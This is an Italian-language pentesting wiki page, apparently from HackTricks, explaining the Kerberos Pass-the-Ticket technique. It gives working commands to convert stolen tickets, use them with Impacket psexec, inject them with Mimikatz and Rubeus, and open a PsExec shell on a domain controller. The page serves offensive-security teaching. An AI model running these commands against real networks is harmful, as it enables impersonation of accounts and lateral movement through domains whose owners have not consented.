# Pass the Ticket

{{#include ../../banners/hacktricks-training.md}}

## Panoramica

In un attacco Pass-the-Ticket (PtT), un adversary utilizza un ticket Kerberos rubato per autenticarsi come principal del ticket senza possedere la password dell'account. Un ticket-granting ticket (TGT) può essere utilizzato per richiedere service ticket, mentre un service ticket rubato è limitato al servizio di destinazione e al relativo periodo di validità.<sup>[[1]](#references)</sup>

Per le tecniche di acquisizione dei ticket, consulta:

- [Acquisizione dei ticket da Windows](../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-windows.md)
- [Acquisizione dei ticket da Linux](../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-linux.md)

## Conversione dei formati dei ticket Linux e Windows

Le cache Kerberos sono comunemente presenti come file MIT `ccache` su Linux e file `.kirbi` su Windows. `ticket_converter` converte questi formati utilizzando un ticket di input e un percorso di output.<sup>[[2]](#references)</sup>
```bash
python ticket_converter.py velociraptor.ccache velociraptor.kirbi
# Expected message: Converting ccache => kirbi
python ticket_converter.py velociraptor.kirbi velociraptor.ccache
# Expected message: Converting kirbi => ccache
```
Kekeo fornisce anche strumenti per i ticket Kerberos su Windows.<sup>[[3]](#references)</sup>

## Using a Ticket

Su Linux, imposta `KRB5CCNAME` sulla cache e indica a un client Impacket di usare Kerberos senza richiedere una password:<sup>[[4]](#references)</sup>
```bash
export KRB5CCNAME=/root/impacket-examples/krb5cc_1120601113_ZFxZpK
python psexec.py jurassic.park/trex@labwws02.jurassic.park -k -no-pass
```
Su Windows, Mimikatz o Rubeus possono importare un ticket `.kirbi` nella sessione di accesso corrente. Usa `klist` per ispezionare la cache risultante.<sup>[[5]](#references)[[6]](#references)</sup>
```powershell
mimikatz.exe "kerberos::ptt [0;28419fe]-2-1-40e00000-trex@krbtgt-JURASSIC.PARK.kirbi"
.\Rubeus.exe ptt /ticket:'[0;28419fe]-2-1-40e00000-trex@krbtgt-JURASSIC.PARK.kirbi'
klist
.\PsExec.exe -accepteula \\lab-wdc01.jurassic.park cmd
```
L'importazione di ticket non concede privilegi oltre a quelli rappresentati dal ticket e dalla policy di autorizzazione del servizio target. I ticket scaduti, revocati, malformati o con ambito errato potrebbero non funzionare.<sup>[[1]](#references)</sup>

Per un contesto più ampio sugli attacchi Kerberos e sulle tecniche correlate di acquisizione dei ticket, consulta la guida agli attacchi Kerberos di Tarlogic.<sup>[[7]](#references)</sup>

## References

- [1] [MITRE ATT&CK T1550.003 - Pass the Ticket](https://attack.mitre.org/techniques/T1550/003/)
- [2] [Zer1t0 - `ticket_converter`](https://github.com/Zer1t0/ticket_converter)
- [3] [gentilkiwi - Kekeo](https://github.com/gentilkiwi/kekeo)
- [4] [Fortra - esempi di Impacket](https://github.com/fortra/impacket/tree/master/examples)
- [5] [gentilkiwi - Mimikatz](https://github.com/gentilkiwi/mimikatz)
- [6] [GhostPack - Rubeus](https://github.com/GhostPack/Rubeus)
- [7] [Tarlogic - tecniche di attacco Kerberos](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
{{#include ../../banners/hacktricks-training.md}}
